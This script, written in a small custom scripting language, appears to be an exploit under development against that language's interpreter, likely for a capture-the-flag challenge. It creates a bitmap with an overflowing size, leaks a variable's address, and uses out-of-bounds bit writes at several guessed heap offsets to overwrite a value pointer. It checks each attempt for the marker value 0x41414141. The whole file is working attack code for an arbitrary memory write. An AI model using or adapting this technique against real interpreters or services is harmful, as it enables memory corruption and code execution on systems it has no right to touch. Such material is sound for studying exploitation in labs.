print("=== Test Different Bitmap Buffer Offsets ===");

int target = 0;
string target = "target";
int targetaddr = target;
print("Target string address:");
print(targetaddr);

int entryaddr = targetaddr - 768;
int valueptraddr = entryaddr + 40;
print("Fixed: entry_addr = targetaddr - 0x300");
print("Fixed: value_ptr_addr = entry_addr + 0x28");
print("value_ptr_addr:");
print(valueptraddr);

print("Creating bitmap");
bitmap b1 = create(9223372036854775807, 2);

print("Test 1: bitmap_data_ptr = targetaddr - 0x1000");
int bitmapptr1 = targetaddr - 4096;
int offset1 = valueptraddr - bitmapptr1;
int bitindex1 = offset1 * 8;
print("bitmap_data_ptr:");
print(bitmapptr1);
print("offset:");
print(offset1);
print("bit_index:");
print(bitindex1);
print("Writing test value...");
set(b1, bitindex1 + 0, 0, 1);
set(b1, bitindex1 + 6, 0, 1);
set(b1, bitindex1 + 8, 0, 1);
set(b1, bitindex1 + 14, 0, 1);
set(b1, bitindex1 + 16, 0, 1);
set(b1, bitindex1 + 22, 0, 1);
set(b1, bitindex1 + 24, 0, 1);
set(b1, bitindex1 + 30, 0, 1);
int test1 = target;
print("test1:");
print(test1);
if (test1 == 1094795585) {
    print("SUCCESS with bitmap offset -0x1000!");
}

print("Test 2: bitmap_data_ptr = targetaddr - 0x2000");
int bitmapptr2 = targetaddr - 8192;
int offset2 = valueptraddr - bitmapptr2;
int bitindex2 = offset2 * 8;
print("bitmap_data_ptr:");
print(bitmapptr2);
print("offset:");
print(offset2);
print("bit_index:");
print(bitindex2);
print("Clearing previous and writing...");
set(b1, bitindex1 + 0, 0, 0);
set(b1, bitindex1 + 6, 0, 0);
set(b1, bitindex1 + 8, 0, 0);
set(b1, bitindex1 + 14, 0, 0);
set(b1, bitindex1 + 16, 0, 0);
set(b1, bitindex1 + 22, 0, 0);
set(b1, bitindex1 + 24, 0, 0);
set(b1, bitindex1 + 30, 0, 0);
set(b1, bitindex2 + 0, 0, 1);
set(b1, bitindex2 + 6, 0, 1);
set(b1, bitindex2 + 8, 0, 1);
set(b1, bitindex2 + 14, 0, 1);
set(b1, bitindex2 + 16, 0, 1);
set(b1, bitindex2 + 22, 0, 1);
set(b1, bitindex2 + 24, 0, 1);
set(b1, bitindex2 + 30, 0, 1);
int test2 = target;
print("test2:");
print(test2);
if (test2 == 1094795585) {
    print("SUCCESS with bitmap offset -0x2000!");
}

print("Test 3: bitmap_data_ptr = targetaddr - 0x3000");
int bitmapptr3 = targetaddr - 12288;
int offset3 = valueptraddr - bitmapptr3;
int bitindex3 = offset3 * 8;
print("Clearing and writing...");
set(b1, bitindex2 + 0, 0, 0);
set(b1, bitindex2 + 6, 0, 0);
set(b1, bitindex2 + 8, 0, 0);
set(b1, bitindex2 + 14, 0, 0);
set(b1, bitindex2 + 16, 0, 0);
set(b1, bitindex2 + 22, 0, 0);
set(b1, bitindex2 + 24, 0, 0);
set(b1, bitindex2 + 30, 0, 0);
set(b1, bitindex3 + 0, 0, 1);
set(b1, bitindex3 + 6, 0, 1);
set(b1, bitindex3 + 8, 0, 1);
set(b1, bitindex3 + 14, 0, 1);
set(b1, bitindex3 + 16, 0, 1);
set(b1, bitindex3 + 22, 0, 1);
set(b1, bitindex3 + 24, 0, 1);
set(b1, bitindex3 + 30, 0, 1);
int test3 = target;
print("test3:");
print(test3);
if (test3 == 1094795585) {
    print("SUCCESS with bitmap offset -0x3000!");
}

print("Test 4: bitmap_data_ptr = targetaddr + 0x1000");
int bitmapptr4 = targetaddr + 4096;
int offset4 = valueptraddr - bitmapptr4;
print("offset4:");
print(offset4);
if (offset4 < 0) {
    print("Negative offset - bitmap is after variables");
    print("This won't work with current calculation");
} else {
    int bitindex4 = offset4 * 8;
    print("bit_index:");
    print(bitindex4);
    set(b1, bitindex3 + 0, 0, 0);
    set(b1, bitindex3 + 6, 0, 0);
    set(b1, bitindex3 + 8, 0, 0);
    set(b1, bitindex3 + 14, 0, 0);
    set(b1, bitindex3 + 16, 0, 0);
    set(b1, bitindex3 + 22, 0, 0);
    set(b1, bitindex3 + 24, 0, 0);
    set(b1, bitindex3 + 30, 0, 0);
    set(b1, bitindex4 + 0, 0, 1);
    set(b1, bitindex4 + 6, 0, 1);
    set(b1, bitindex4 + 8, 0, 1);
    set(b1, bitindex4 + 14, 0, 1);
    set(b1, bitindex4 + 16, 0, 1);
    set(b1, bitindex4 + 22, 0, 1);
    set(b1, bitindex4 + 24, 0, 1);
    set(b1, bitindex4 + 30, 0, 1);
    int test4 = target;
    print("test4:");
    print(test4);
    if (test4 == 1094795585) {
        print("SUCCESS with bitmap offset +0x1000!");
    }
}

print("If none work, might need to try different entry offsets too");

